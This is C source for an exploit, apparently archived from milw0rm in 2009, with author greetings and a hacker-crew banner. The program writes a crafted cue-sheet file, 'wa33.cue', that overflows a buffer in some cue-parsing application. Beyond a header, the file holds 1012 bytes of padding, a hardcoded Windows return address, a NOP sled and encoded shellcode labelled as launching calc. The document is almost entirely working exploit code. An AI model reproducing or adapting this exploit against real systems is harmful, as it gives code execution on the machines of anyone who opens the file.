/*

  Author: Assed Edin
  E-mail: storms0uth@hotmail.com
  GreetS : Xcracker & SimO-s0ft & Ga3 Drari Wlad MArrakech ^_^ o Manssawch Lycéé Hassan2 & Str0ke
  
*/



#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#define OFFSET 1012


char header1[]=     
"\x46\x49\x4c\x45\x20\x22";

char header2[]= 
"\x2e\x42\x49\x4e\x22\x20\x42\x49\x4e\x41\x52\x59\x0d\x0a\x20"
"\x54\x52\x41\x43\x4b\x20\x30\x31\x20\x4d\x4f\x44\x45\x31\x2f\x32"
"\x33\x35\x32\x0d\x0a\x20\x20\x20\x49\x4e\x44\x45\x58\x20\x30\x31"
"\x20\x30\x30\x3a\x30\x30\x3a\x30\x30";
//calc 343
char scode[]=
"\x31\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x08"
"\x99\x23\x82\x83\xeb\xfc\xe2\xf4\xf4\x71\x67\x82\x08\x99\xa8\xc7"
"\x34\x12\x5f\x87\x70\x98\xcc\x09\x47\x81\xa8\xdd\x28\x98\xc8\xcb"
"\x83\xad\xa8\x83\xe6\xa8\xe3\x1b\xa4\x1d\xe3\xf6\x0f\x58\xe9\x8f"
"\x09\x5b\xc8\x76\x33\xcd\x07\x86\x7d\x7c\xa8\xdd\x2c\x98\xc8\xe4"
"\x83\x95\x68\x09\x57\x85\x22\x69\x83\x85\xa8\x83\xe3\x10\x7f\xa6"
"\x0c\x5a\x12\x42\x6c\x12\x63\xb2\x8d\x59\x5b\x8e\x83\xd9\x2f\x09"
"\x78\x85\x8e\x09\x60\x91\xc8\x8b\x83\x19\x93\x82\x08\x99\xa8\xea"
"\x34\xc6\x12\x74\x68\xcf\xaa\x7a\x8b\x59\x58\xd2\x60\x69\xa9\x86"
"\x57\xf1\xbb\x7c\x82\x97\x74\x7d\xef\xfa\x42\xee\x6b\x99\x23\x82";

char NOP[]="\x90\x90\x90\x90";
int main(int argc,char *argv[]){
  FILE *openfile;
  unsigned char *buffer;
  unsigned int RET =0x7c836960;
  int offset=0;
  printf("Coded By Assad edin (Sat0rA-Cr3w - Moroccan Hackers)\n");
  printf("Email : storms0uth@hotmail.com\n");
  if ((openfile=fopen("wa33.cue","wb"))==NULL){
                                            perror("Canot open file");
                                            }
  buffer = (unsigned char *) malloc (OFFSET+4+strlen(NOP)+strlen(scode));
  memset(buffer,0x90,OFFSET+4+strlen(NOP)+strlen(scode));
  offset=OFFSET;
  memcpy(buffer+offset,&RET,4);
  offset+=4;
  memcpy(buffer+offset,NOP,strlen(NOP));
  offset+=strlen(NOP);
  memcpy(buffer+offset,scode,strlen(scode));
  offset+=strlen(scode);
  fputs(header1,openfile);
  fputs(buffer,openfile);
  fputs(header2,openfile);
  fclose(openfile);
  free(buffer);
  return 0;
}

// milw0rm.com [2009-03-02]
